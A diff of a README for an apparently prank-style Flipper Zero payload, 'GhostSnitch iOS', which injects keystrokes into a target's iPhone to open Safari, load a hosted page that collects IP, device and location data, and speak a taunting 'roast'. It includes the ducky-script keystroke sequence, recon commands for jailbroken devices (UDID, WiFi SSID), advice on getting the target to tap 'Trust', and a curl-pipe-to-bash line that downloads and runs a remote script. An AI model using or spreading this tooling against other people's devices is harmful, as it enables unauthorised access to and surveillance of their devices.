@@ -1,104 +1,96 @@
-# 🍎 GhostSnitch iOS
+# GhostSnitch iOS
 
-GhostSnitch adapted for iOS - **works on ANY iOS device!** Executes roast-style recon using device info, TTS, and optional location detection.
+**Version:** 1.1  
+**Author:** I am TBJr  
+**Platform:** iOS / iPadOS (Safari) · Jailbroken devices (shell)  
+**Delivery:** Flipper Zero HID
 
-## 🧠 Features
-- **Universal compatibility**: Works on ANY iOS device with Safari (pre-installed)
-- **No jailbreak required**: Uses Web APIs for device info and TTS (Web Speech API)
-- **Automatic execution**: Opens Safari and executes script automatically
-- **Device reconnaissance**: Collects device model, iOS version, and platform info
-- **System information**: Reads public IP, estimated RAM, network connection type
-- **Battery status**: Checks battery level (if API available)
-- **Screen information**: Detects screen resolution and pixel ratio
-- **Language detection**: Identifies system languages
-- **Location detection**: Optional geolocation (if permissions granted)
-- **Text-to-speech roast**: Delivers roast using Web Speech API (no special apps needed)
-- **Jailbroken support**: Optional shell script for jailbroken devices with enhanced features
+---
 
-## 🚀 How to Use
+## What it does
 
-### Prerequisites
-**Minimum Requirements (Web Mode - Works on ALL devices):**
-- iOS device with Safari browser (pre-installed on all iOS devices)
-- Network connectivity (for script download and IP detection)
+Opens Safari on the target device, navigates to a hosted HTML page, and delivers a roast using device info gathered from browser APIs. A separate shell script is available for jailbroken devices with additional recon capabilities.
 
-**Enhanced Mode (Optional - Requires Jailbreak):**
-- Jailbroken iOS device with shell access
-- Terminal app installed (e.g., NewTerm, MTerminal)
-- Appropriate permissions for system information access
+---
 
-### Execution
-1. Load `GhostSnitch_iOS.txt` onto your Flipper Zero
-2. Connect Flipper Zero to target iOS device via USB (with USB adapter)
-3. Run the payload - it will:
-   - **Primary method**: Open Safari and execute web-based script (works on all devices)
-   - Deliver the roast via text-to-speech
+## Files
 
-### How It Works
+| File | Purpose |
+|---|---|
+| `GhostSnitch_iOS.txt` | Flipper Zero ducky script |
+| `host/ghostsnitch_ios.html` | Web-based payload (primary — works on all devices) |
+| `host/ghostsnitch_ios.sh` | Shell script for jailbroken devices |
 
-**Primary Method (Web-based - Universal):**
-The payload opens Safari with a hosted HTML page that uses:
-- **Web Speech API** for text-to-speech (no special apps needed)
-- **Navigator API** for device information (model, iOS version, platform)
-- **Battery API** for battery status (if available)
-- **Network Information API** for connection details
-- **Screen API** for display information
-- **Geolocation API** for location (optional, requires permission)
-- **Fetch API** for IP detection
+---
 
-The payload uses Spotlight search to open Safari:
-1. Opens Spotlight (Cmd+Space)
-2. Types "safari"
-3. Opens Safari
-4. Navigates to the hosted script URL
+## Web payload (primary)
 
-**Enhanced Method (Jailbroken - Optional):**
-If the device is jailbroken, you can execute the shell script directly:
-- WiFi SSID detection (via airport command)
-- Enhanced system information (via sysctl, sw_vers)
-- Device UDID detection
-- Local IP addresses
+The HTML page gathers data via browser APIs and speaks a roast via the Web Speech API.
+
+**Important — tap required:** The page shows a **"Tap to Continue"** button when it loads. The target must tap it once. iOS Safari blocks `speechSynthesis.speak()` without a prior user gesture — this cannot be bypassed from a web page.
+
+**API availability in iOS Safari:**
+
+| API | Available | Notes |
+|---|---|---|
+| User-Agent parsing | ✓ | iOS version + device family (iPhone/iPad/iPod) |
+| `deviceMemory` | — | Intentionally absent from Safari (Apple privacy decision) |
+| `navigator.getBattery()` | — | Removed from Safari; handled gracefully |
+| `navigator.connection` | — | Network Information API not in Safari |
+| `fetch` (IP lookup) | ✓ | `api.ipify.org` with `api4.my-ip.io` fallback |
+| `geolocation` | ✓ | Requires user permission dialog |
+| `screen.width/height` | ✓ | Reports CSS (logical) pixels; physical = CSS × `devicePixelRatio` |
+| `navigator.languages` | ✓ | Language list |
+| Web Speech API | ✓* | *Requires user gesture — handled by tap gate |
+
+---
+
+## Ducky script flow
+
+```
+1. GUI SPACE   → Spotlight search (Cmd+Space — works on iPhone and iPad with external keyboard)
+2. STRING safari
+3. ENTER        → open Safari
+4. GUI l        → CMD+L — focus Safari address bar  ← required; without this the URL is not entered
+5. STRING <url>
+6. ENTER
+```
+
+**Important:** iOS shows a **"Trust this accessory?"** dialog the first time a USB HID device is connected. The target must tap "Trust" before any keystrokes are accepted. Plan for this in timing.
+
+---
+
+## Jailbroken device path (optional)
+
+`ghostsnitch_ios.sh` provides additional recon not available via the browser:
+
+| Feature | Method |
+|---|---|
+| iOS version | `sw_vers` → `defaults read SystemVersion.plist` → `uname -r` |
+| Device model | `sysctl -n hw.model` (returns e.g. `iPhone14,3`) |
+| RAM | `sysctl -n hw.memsize` |
+| Battery % | `ioreg -l` → `CurrentCapacity / MaxCapacity` (replaces Linux `/sys/class/power_supply` path) |
+| WiFi SSID | `networksetup` → `/usr/sbin/airport` → airport preferences plist |
+| Chip ID / UDID | `ioreg -l` → `UniqueChipID` → `system_profiler` fallback |
+
+Requirements: jailbroken device, shell access (SSH or NewTerm), `bash` and `curl` installed (via Procursus/Sileo or Cydia).
 
 ```bash
 bash -c "$(curl -fsSL https://tbjr.github.io/Flipper-payloads/host/ghostsnitch_ios.sh)"
 ```
 
-## ⚠️ iOS-Specific Limitations
+---
 
-- **No native shell access**: iOS doesn't support command-line execution without jailbreak
-- **Web-based only**: Non-jailbroken devices can only use the web-based method
-- **Speech synthesis restrictions**: iOS Safari may require user interaction for speech synthesis
-- **Permission requirements**: Location and battery APIs may require user permission
-- **Network connectivity required** for IP detection and script download
-- **Spotlight search dependency**: Payload relies on Spotlight to open Safari (may vary by iOS version)
+## Known limitations
 
-## 🔧 iOS Version Compatibility
+- **Battery and Network Information APIs are absent from Safari** — these are Apple privacy decisions, not bugs. The page shows a clear "Not available" label for both.
+- **Device model** is not exposed in the iOS Safari User-Agent string — only the device family (iPhone/iPad/iPod) can be detected. Screen resolution and pixel ratio help narrow down the generation.
+- **Spotlight** may open a web search result instead of the Safari app on some configurations — a longer `DELAY` after `ENTER` or a second `ENTER` may help.
+- **CMD+L** focuses the address bar on iOS 16+ with an external keyboard. Older iOS versions may require tapping the address bar manually.
+- Jailbreak penetration is under 1% of the iOS install base — `ghostsnitch_ios.sh` is a niche path.
 
-- **iOS 12+**: Full Web API support
-- **iOS 11**: Limited Web API support
-- **iOS 10 and below**: May have limited functionality
+---
 
-## 📱 Device Detection
+## Credits
 
-The script automatically detects:
-- iPhone models
-- iPad models
-- iPod touch models
-- iOS version
-- Device platform information
-
-## ✨ What's New in v1.0
-
-- **Universal iOS support**: Works on any iOS device with Safari
-- **Web-based execution**: Uses Web APIs for universal compatibility
-- **iOS-specific features**: Battery status, screen info, language detection
-- **Jailbroken device support**: Optional shell script for enhanced features
-- **Improved device detection**: Accurate iOS version and device model detection
-- **Better error handling**: Gracefully handles missing APIs and permissions
-
-## 🔧 Version
-**v1.0** - Initial iOS release with universal Web API support!
-
-## 🙏 Credits
-Based on the original GhostSnitch prank for Windows. Reimagined for iOS by **TBJr**
-
+Based on the original GhostSnitch for Windows. Reimagined for iOS by **TBJr**.
